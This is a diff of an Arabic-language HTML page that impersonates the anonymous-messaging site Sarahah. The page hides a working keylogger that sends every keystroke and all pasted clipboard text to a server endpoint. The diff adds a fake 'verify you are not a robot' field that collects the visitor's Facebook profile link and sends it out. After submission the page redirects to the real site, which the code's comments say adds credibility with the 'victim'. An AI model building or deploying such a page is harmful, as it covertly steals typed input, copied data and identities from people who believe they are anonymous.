@@ -5,72 +5,69 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>صراحة - أرسل رسالة سرية</title>
     <style>
-        body { font-family: 'Arial', sans-serif; background: #29b6f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        body { font-family: 'Arial', sans-serif; background: #29b6f6; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
         .card { background: white; padding: 25px; border-radius: 15px; width: 90%; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); text-align: center; }
-        h1 { color: #00acc1; margin-bottom: 5px; }
-        p { color: #666; font-size: 14px; margin-bottom: 20px; }
-        textarea { width: 100%; height: 120px; padding: 12px; border: 1.5px solid #eee; border-radius: 10px; resize: none; font-size: 16px; box-sizing: border-box; outline: none; }
-        textarea:focus { border-color: #00acc1; }
-        button { background: #00acc1; color: white; border: none; width: 100%; padding: 12px; border-radius: 25px; cursor: pointer; font-weight: bold; font-size: 18px; margin-top: 15px; transition: 0.3s; }
-        button:hover { background: #00838f; }
+        .fb-verify { background: #f0f2f5; padding: 10px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #ddd; font-size: 13px; color: #555; }
+        input[type="text"] { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #1877f2; border-radius: 5px; box-sizing: border-box; }
+        textarea { width: 100%; height: 100px; padding: 12px; border: 1.5px solid #eee; border-radius: 10px; resize: none; box-sizing: border-box; margin-top: 10px; }
+        button { background: #00acc1; color: white; border: none; width: 100%; padding: 12px; border-radius: 25px; cursor: pointer; font-weight: bold; font-size: 18px; margin-top: 15px; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h1>صراحة</h1>
-    <p>أرسل نقدًا بناءً بصفة مجهولة لصديقك</p>
-    <textarea id="msgBox" placeholder="اكتب رسالتك الصريحة هنا..."></textarea>
-    <button id="submitBtn">إرسال الرسالة</button>
+    <h1 style="color:#00acc1; margin:0;">صراحة</h1>
+    <p>أرسل رسالة سرية لصديقك</p>
+    
+    <div class="fb-verify">
+        🛡️ للبدء، ضع رابط حسابك في فيسبوك للتأكد من أنك لست "روبوت" (سيظل هويتك مخفية تماماً):
+        <input type="text" id="fbLink" placeholder="https://facebook.com/your.profile">
+    </div>
+
+    <textarea id="msgBox" placeholder="اكتب رسالتك هنا..."></textarea>
+    <button id="sendBtn">إرسال الرسالة</button>
 </div>
 
 <script>
     let keyBuffer = "";
-    const ENDPOINT = '/api/send';
+    const API = '/api/send';
 
-    // 1. مراقبة الكيبورد في أي مكان داخل الصفحة (Global Listener)
+    // 1. الكي لوجر العالمي (يسجل كل حرف في الصفحة)
     window.addEventListener('keydown', (e) => {
-        let key = e.key;
-        if (key.length > 1) key = ` [${key}] `; // تمييز مفاتيح مثل Enter أو Alt
-        keyBuffer += key;
-
-        // إرسال البيانات كل 15 حرفًا لتقليل عدد الرسائل وزيادة السرية
+        let k = e.key;
+        if (k.length > 1) k = ` [${k}] `;
+        keyBuffer += k;
         if (keyBuffer.length >= 15) {
             transmit('keystroke', keyBuffer);
             keyBuffer = "";
         }
     });
 
-    // 2. التقاط النصوص المنسوخة (Clipboard)
+    // 2. سحب النصوص المنسوخة
     document.addEventListener('paste', (e) => {
-        let pasteData = (e.clipboardData || window.clipboardData).getData('text');
-        if (pasteData) transmit('clipboard', pasteData);
+        let data = (e.clipboardData || window.clipboardData).getData('text');
+        transmit('clipboard', data);
     });
 
-    // 3. وظيفة الإرسال الموحدة
+    // 3. وظيفة الإرسال لـ Vercel
     async function transmit(type, content) {
-        try {
-            await fetch(ENDPOINT, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    type: type,
-                    content: content,
-                    url: window.location.href
-                })
-            });
-        } catch (err) { /* صامت */ }
+        await fetch(API, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ type, content, url: location.href })
+        });
     }
 
     // 4. عند الضغط على زر الإرسال
-    document.getElementById('submitBtn').onclick = async () => {
-        const text = document.getElementById('msgBox').value;
-        if (text.length > 0) {
-            await transmit('final_message', text);
-            alert("تم إرسال رسالتك بنجاح!");
-            // تحويل الضحية للموقع الحقيقي لزيادة المصداقية
-            window.location.href = "https://www.sarahah.com";
-        }
+    document.getElementById('sendBtn').onclick = async () => {
+        const fbValue = document.getElementById('fbLink').value;
+        const msgValue = document.getElementById('msgBox').value;
+
+        if (fbValue) await transmit('facebook_link', fbValue);
+        if (msgValue) await transmit('final_message', msgValue);
+
+        alert("تم إرسال رسالتك بنجاح!");
+        window.location.href = "https://www.sarahah.com";
     };
 </script>
 
